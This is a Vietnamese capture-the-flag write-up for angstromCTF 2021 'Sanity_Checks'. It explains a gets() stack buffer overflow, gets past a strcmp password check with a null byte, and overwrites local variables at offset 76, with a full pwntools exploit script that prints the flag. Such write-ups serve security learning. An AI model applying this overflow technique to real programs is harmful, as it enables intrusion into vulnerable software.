# [angstromCTF-2021] Sanity_Checks
<p>Tại dòng 20, chương trình dùng gets để nhập vào buffer có kích thước 64 bytes -> Buffer overflow. Dòng 21 dùng strcmp(s1, "password123") để kiểm tra mật khẩu. Sau khi mật khẩu đúng, chương trình tiếp tục kiểm tra nếu các biến v7 đến v11 bằng các giá trị cố định thì in ra flag.</p>

![alt text](/thanhlai/post/buffer_overflow/image/post4/image.png)

<p>Tính được offset để bắt đầu ghi đè lên giá trị v7 là 76. Vì v7 đến v11 đều có kiểu int nên kích thước sẽ là 4 byte -> 4 byte tiếp theo tính từ v7 sẽ là v8 và cứ thế tiếp tục.</p>

![alt text](/thanhlai/post/buffer_overflow/image/post4/image-2.png)

<p>Để bypass hàm strcmp ở dòng 21, ta sẽ ghi chuỗi "password123" và thêm null byte để strcmp sẽ dừng và xác định 2 chuỗi là bằng nhau. Tiếp theo, padding cho đến địa chỉ của v7. Script exploit:</p>

```
from pwn import *

p = process('./checks')

cmp = b'password123\x00'
v7 = p32(0x11)
v8 = p32(0x3d)
v9 = p32(0xf5)
v10 = p32(0x37)
v11 = p32(0x32)
payload = cmp + b'a' * (76 - len(cmp)) + v7 + v8 + v9 + v10 + v11

p.sendlineafter(b'Enter the secret word: ', payload)

p.interactive()
```

<p>Chạy script và lấy được flag thành công.</p>

![alt text](/thanhlai/post/buffer_overflow/image/post4/image-3.png)
